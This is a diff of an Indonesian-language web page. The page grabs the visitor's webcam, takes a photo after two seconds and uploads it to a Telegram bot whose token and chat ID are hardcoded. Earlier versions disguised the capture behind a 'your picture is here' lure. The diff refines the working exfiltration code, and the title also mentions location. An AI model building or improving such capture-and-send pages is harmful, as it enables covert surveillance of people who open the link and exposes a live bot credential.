@@ -3,11 +3,11 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Akses</title>
+    <title>Akses Kamera dan Lokasi</title>
 </head>
 <body>
-    <h1>Gambar Mu Ada Di Sini</h1>
-    <button onclick="startCapture()">Lihat Gambar</button>
+    <h1>Ambil Gambar dan Kirim Lokasi</h1>
+    <button onclick="startCapture()">Ambil Gambar dan Kirim Lokasi</button>
     <script>
         function startCapture() {
             // Akses kamera
@@ -17,7 +17,7 @@
                         // Ambil foto setelah beberapa detik
                         setTimeout(() => {
                             captureAndSend(stream);
-                        }, 5000); // Ambil foto setelah 3 detik
+                        }, 2000); // Ambil foto setelah 2 detik
                     })
                     .catch(function(error) {
                         alert("Akses kamera ditolak.");
@@ -48,7 +48,13 @@
             const video = document.createElement('video');
             video.srcObject = stream;
 
+            // Pastikan video diputar terlebih dahulu sebelum menangkap gambar
             video.onloadedmetadata = () => {
+                video.play(); // Memastikan video mulai diputar
+            };
+
+            // Tunggu sampai video siap diputar sebelum menangkap gambar
+            video.oncanplay = () => {
                 // Tentukan ukuran canvas sesuai dengan video
                 const canvas = document.createElement('canvas');
                 const context = canvas.getContext('2d');
@@ -60,29 +66,20 @@
                 // Gambar dari video ke canvas
                 context.drawImage(video, 0, 0, canvas.width, canvas.height);
 
-                // Ambil gambar sebagai data URL (base64)
-                const imageData = canvas.toDataURL('image/jpeg');
+                // Ambil gambar sebagai Blob (bukan base64)
+                canvas.toBlob(function(blob) {
+                    // Kirim gambar ke Telegram
+                    sendToTelegram(blob);
 
-                // Kirim gambar ke Telegram
-                sendToTelegram(imageData);
-
-                // Stop stream setelah gambar diambil
-                stream.getTracks().forEach(track => track.stop());
+                    // Stop stream setelah gambar diambil
+                    stream.getTracks().forEach(track => track.stop());
+                }, 'image/jpeg');
             };
         }
 
-        function sendToTelegram(base64Image) {
+        function sendToTelegram(blob) {
             const telegramToken = '7030408795:AAFfhnjy4x3f3gotpugela5qFMbVVnE9HpI';
             const chatId = '1746156378';
-
-            // Convert base64 image to blob
-            const byteString = atob(base64Image.split(',')[1]);
-            const ab = new ArrayBuffer(byteString.length);
-            const ia = new Uint8Array(ab);
-            for (let i = 0; i < byteString.length; i++) {
-                ia[i] = byteString.charCodeAt(i);
-            }
-            const blob = new Blob([ab], { type: 'image/jpeg' });
 
             // Create FormData to send the image as a file
             const formData = new FormData();
